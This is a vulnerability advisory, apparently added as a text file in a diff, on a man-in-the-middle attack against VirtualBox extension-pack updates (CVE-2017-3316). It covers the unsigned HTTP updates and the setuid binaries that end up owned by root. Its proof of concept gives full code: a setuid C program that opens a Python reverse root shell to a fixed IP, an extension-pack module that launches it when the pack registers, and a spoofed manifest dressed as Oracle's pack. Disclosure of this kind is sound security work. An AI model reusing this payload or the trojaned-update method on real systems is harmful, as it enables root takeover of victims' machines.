@@ -1,0 +1,192 @@
+== [ Overview ] ===
+
+    System affected: VirtualBox
+    Software-Version: prior to 5.0.32, prior to 5.1.14
+    User-Interaction: Required
+    Impact: A Man-In-The-Middle could infiltrate an
+Extension-Pack-Update to gain a root-shell
+
+=== [ Detailed description ] ===
+
+In my research about update mechanism of open-source software I found
+vulnerabilities in Oracle's VirtualBox. It's possible to compromise a
+system behind a firewall by infiltrating the updates of Extension-Packs
+because of the following flaws:
+
+1.  The Extension-Pack is updated via HTTP instead of HTTPS. The
+Extension-Packs are not signed, so a Man-In-The-Middle could send his
+own Extension-Pack(with malicious code included) instead of the regular
+update to the target. The Code would be executed with user-permissions.
+I reported this bug to Oracle but I think someone else discovered and
+reported it before. This bug also affects VirtualBox prior to 5.0.32,
+prior to 5.1.14. I don't know the CVE.
+
+2.  CVE-2017-3316: There is a privilege escalation bug in the downloader
+of VirtualBox. Extension-Packs are tar-archives. Tar-archives can
+preserve permissions.  A Man-In-The-Middle could include an executable
+with setuid-permissions to the Extension-Pack. If the victim downloads
+the Ext-pack, it will be stored as owner root and without checking the
+permissions of the binaries. This bug affects VirtualBox prior to
+5.0.32, prior to 5.1.14
+
+=== [ Proof-Of-Concept ] ===
+
+The executeable of the following code is placed in the
+Extension-Pack-Archive under linux.amd64/evil with setuid.
+
+/* evil.c(executable with the reverse-shell) */
+#include <unistd.h>
+
+int main()
+{
+        setuid(0);
+        execl("/usr/bin/python","python","-c","import
+socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"10.12.32.15\",5000));os.dup2(s.fileno(),0);
+os.dup2(s.fileno(),1);
+os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/bash\",\"-i\"]);",NULL);
+        return 0;
+}
+
+The  VirtualBox-Sources are downloaded next and the following code has
+to be placed under src/VBox/ExtPacks/Evil/VBoxEvilMain.cpp:
+
+/* $Id: VBoxEvilMain.cpp $ */
+/** @file
+ * Evil main module.
+ */
+
+/*
+ * Copyright (C) 2010-2016 Oracle Corporation
+ *
+ * Permission is hereby granted, free of charge, to any person
+ * obtaining a copy of this software and associated documentation
+ * files (the "Software"), to deal in the Software without
+ * restriction, including without limitation the rights to use,
+ * copy, modify, merge, publish, distribute, sublicense, and/or sell
+ * copies of the Software, and to permit persons to whom the
+ * Software is furnished to do so, subject to the following
+ * conditions:
+ *
+ * The above copyright notice and this permission notice shall be
+ * included in all copies or substantial portions of the Software.
+ *
+ * THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND,
+ * EXPRESS OR IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES
+ * OF MERCHANTABILITY, FITNESS FOR A PARTICULAR PURPOSE AND
+ * NONINFRINGEMENT. IN NO EVENT SHALL THE AUTHORS OR COPYRIGHT
+ * HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER LIABILITY,
+ * WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING
+ * FROM, OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR
+ * OTHER DEALINGS IN THE SOFTWARE.
+ */
+
+#include <VBox/ExtPack/ExtPack.h>
+
+#include <VBox/err.h>
+#include <VBox/version.h>
+#include <VBox/vmm/cfgm.h>
+#include <iprt/string.h>
+#include <iprt/param.h>
+#include <iprt/path.h>
+
+
+
+static PCVBOXEXTPACKHLP g_pHlp;
+
+static const VBOXEXTPACKREG g_vboxEvilExtPackReg =
+{
+    VBOXEXTPACKREG_VERSION,
+    /* .uVBoxFullVersion =  */  VBOX_FULL_VERSION,
+    /* .pfnInstalled =      */  NULL,
+    /* .pfnUninstall =      */  NULL,
+    /* .pfnVirtualBoxReady =*/  NULL,
+    /* .pfnConsoleReady =   */  NULL,
+    /* .pfnUnload =         */  NULL,
+    /* .pfnVMCreated =      */  NULL,
+    /* .pfnVMConfigureVMM = */  NULL,
+    /* .pfnVMPowerOn =      */  NULL,
+    /* .pfnVMPowerOff =     */  NULL,
+    /* .pfnQueryObject =    */  NULL,
+    /* .pfnReserved1 =      */  NULL,
+    /* .pfnReserved2 =      */  NULL,
+    /* .pfnReserved3 =      */  NULL,
+    /* .pfnReserved4 =      */  NULL,
+    /* .pfnReserved5 =      */  NULL,
+    /* .pfnReserved6 =      */  NULL,
+    /* .u32Reserved7 =      */  0,
+    VBOXEXTPACKREG_VERSION
+};
+
+#include <unistd.h>
+/** @callback_method_impl{FNVBOXEXTPACKREGISTER}  */
+extern "C" DECLEXPORT(int) VBoxExtPackRegister(PCVBOXEXTPACKHLP pHlp,
+PCVBOXEXTPACKREG *ppReg, PRTERRINFO pErrInfo)
+{
+
+    pid_t pid = fork();
+        if(pid == 0)
+        {
+        
+execl("/usr/lib/virtualbox/ExtensionPacks/Oracle_VM_VirtualBox_Extension_Pack/linux.amd64/evil","evil",NULL);
+        }
+    /*
+     * Check the VirtualBox version.
+     */
+    if (!VBOXEXTPACK_IS_VER_COMPAT(pHlp->u32Version,
+VBOXEXTPACKHLP_VERSION))
+        return RTErrInfoSetF(pErrInfo, VERR_VERSION_MISMATCH,
+                             "Helper version mismatch - expected %#x got
+%#x",
+                             VBOXEXTPACKHLP_VERSION, pHlp->u32Version);
+    if (   VBOX_FULL_VERSION_GET_MAJOR(pHlp->uVBoxFullVersion) !=
+VBOX_VERSION_MAJOR
+        || VBOX_FULL_VERSION_GET_MINOR(pHlp->uVBoxFullVersion) !=
+VBOX_VERSION_MINOR)
+        return RTErrInfoSetF(pErrInfo, VERR_VERSION_MISMATCH,
+                             "VirtualBox version mismatch - expected
+%u.%u got %u.%u",
+                             VBOX_VERSION_MAJOR, VBOX_VERSION_MINOR,
+
+VBOX_FULL_VERSION_GET_MAJOR(pHlp->uVBoxFullVersion),
+
+VBOX_FULL_VERSION_GET_MINOR(pHlp->uVBoxFullVersion));
+
+    /*
+     * We're good, save input and return the registration structure.
+     */
+    g_pHlp = pHlp;
+    *ppReg = &g_vboxEvilExtPackReg;
+
+    return VINF_SUCCESS;
+}
+
+After compiling, this Extension-Pack-Module is placed in the Archive
+under linux.amd64/VBoxEvilMain.so. It's also necessary to modify the
+ExtPack.xml so that the Evil-Module is used:
+
+<!--?xml version="1.0"?-->
+<virtualboxextensionpack version="1.0"
+xmlns="http://www.virtualbox.org/VirtualBoxExtensionPack";>
+    <name>Oracle VM VirtualBox Extension Pack</name>
+    <description>USB 2.0 and USB 3.0 Host Controller, Host Webcam,
+VirtualBox RDP, PXE ROM, Disk Encryption.</description>
+    <version revision="112026">5.1.10</version>
+    <mainmodule>VBoxEvilMain</mainmodule>
+    <vrdemodule>VBoxVRDP</vrdemodule>
+    <showlicense>
+</showlicense></virtualboxextensionpack>
+
+Note: To make this Extension-Pack valid it is necessary to add all the
+file-checksumms to ExtPack.manifest. The victim will be asked for the
+root password during the update. If the attacker sends this malicious
+Extension-Pack, a reverse root-shell will be executed.
+
+=== [ Timeline ] ===
+
+This bug was reported in December. Oracle answered on the same day and
+gave status reports regularly. They released a patch on January 17th.
+
+=== [ Credits ] ===
+
+CVE-2017-3316 was discovered by Wolfgang Hotwagner
+(https://tech.feedyourhead.at/content/privilege-escalation-in-virtualbox-cve-2017-3316)
